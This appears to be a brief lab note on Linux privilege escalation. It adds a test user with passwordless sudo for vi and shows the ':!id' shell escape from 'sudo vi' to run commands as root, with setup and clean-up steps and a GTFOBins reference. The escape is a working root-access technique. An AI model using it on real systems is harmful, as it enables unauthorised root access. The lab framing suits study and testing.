# Setup

```sh
# root
cp /etc/sudoers /etc/sudoers.bak
adduser sudo0
echo "sudo0 ALL=(ALL) NOPASSWD: /usr/bin/vi" >> /etc/sudoers
```

# Exploit

```bash
sudo vi
:!id
```

# Clean Up

```bash
deluser sudo0 --remove-home
cp /etc/sudoers.bak /etc/sudoers
```

# references

https://gtfobins.github.io